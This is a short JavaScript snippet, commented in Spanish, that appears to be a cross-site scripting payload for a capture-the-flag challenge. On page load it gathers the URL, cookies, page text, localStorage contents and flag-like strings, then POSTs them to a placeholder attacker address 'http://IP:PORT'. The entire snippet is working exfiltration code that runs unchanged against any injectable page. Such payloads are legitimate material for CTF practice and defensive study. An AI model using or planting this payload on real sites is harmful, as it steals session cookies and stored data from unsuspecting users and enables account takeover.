// Exfiltrar datos cuando la página carga
setTimeout(() => {
  const data = {
    url: window.location.href,
    cookies: document.cookie,
    html: document.body.innerText.substring(0, 10000),
    localStorage: JSON.stringify(localStorage),
    flag: document.body.innerText.match(/flag\{[^\}]+\}/gi) || 
          document.body.innerText.match(/CTF\{[^\}]+\}/gi) ||
          document.body.innerText.match(/[A-Z0-9]{20,}/g)
  };
  
  fetch('http://IP:PORT/?cookie', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify(data)
  }).catch(e => console.log(e));
}, 500);
